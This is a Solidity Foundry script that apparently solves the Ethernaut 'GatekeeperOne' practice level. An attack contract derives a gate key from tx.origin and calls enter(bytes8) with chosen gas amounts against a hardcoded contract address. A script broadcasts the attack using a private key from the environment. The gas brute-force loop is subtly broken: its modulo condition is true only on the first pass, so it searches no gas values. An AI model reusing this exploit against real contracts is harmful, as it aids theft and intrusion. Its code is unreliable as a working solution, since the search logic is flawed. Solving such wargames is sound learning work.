//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract GatekeeperOneAttack {

  GatekeeperOne gateKeeperOneInstance = GatekeeperOne(0x8aED719917d32A8d9d7ef7d5Ab270AF641c00f22);

  function gateOneAttack() external {
    // bytes8  _gatekey = 0xFFFFFFFF0000FFFF & bytes8(uint64(tx.origin));
    bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    // console.log("gateKey: ",_gateKey);
    for(uint256 i = 0; i < 300; i++) {

    

      if(((8191 * 3) + i) % 8191 == 0) {
        
          (bool success,) = address(gateKeeperOneInstance).call{gas: (8191 *3) + i}(abi.encodeWithSignature("enter(bytes8)",_gateKey));
        if(success) {
          break;
        }
      }
    }
  }

}


contract GatekeeperOneSolution is Script {
  
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    console.log("msg sender: ", msg.sender);
    GatekeeperOneAttack gateOneAttackInstance =  new GatekeeperOneAttack();
    gateOneAttackInstance.gateOneAttack();
    vm.stopBroadcast();
  }
}